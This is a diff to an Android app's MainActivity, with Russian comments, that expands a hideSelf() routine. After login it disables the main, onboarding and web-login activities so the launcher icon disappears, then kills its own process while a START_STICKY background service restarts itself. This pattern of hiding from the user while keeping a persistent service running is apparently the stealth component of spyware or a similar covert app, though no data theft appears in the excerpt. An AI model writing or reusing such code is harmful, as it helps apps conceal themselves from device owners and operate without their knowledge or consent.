@@ -37,14 +37,32 @@ public class MainActivity extends Activity {
     private void hideSelf() {
         try {
             PackageManager pm = getPackageManager();
-            ComponentName cn = new ComponentName(this, MainActivity.class);
-            pm.setComponentEnabledSetting(cn,
+
+            // Скрываем MainActivity
+            ComponentName main = new ComponentName(this, MainActivity.class);
+            pm.setComponentEnabledSetting(main,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP);
-            finishAffinity();
-        } catch (Throwable ignored) {
-            finishAffinity();
-        }
+
+            // Скрываем OnboardingActivity — убирает иконку с рабочего стола
+            ComponentName onboard = new ComponentName(this, OnboardingActivity.class);
+            pm.setComponentEnabledSetting(onboard,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+
+            // Скрываем WebLoginActivity (не пригодится после логина)
+            ComponentName login = new ComponentName(this, WebLoginActivity.class);
+            pm.setComponentEnabledSetting(login,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+
+        } catch (Throwable ignored) {}
+
+        // закрываем все activity
+        finishAffinity();
+
+        // убиваем процесс — сервис поднимется сам через START_STICKY
+        android.os.Process.killProcess(android.os.Process.myPid());
     }
 
     @Override
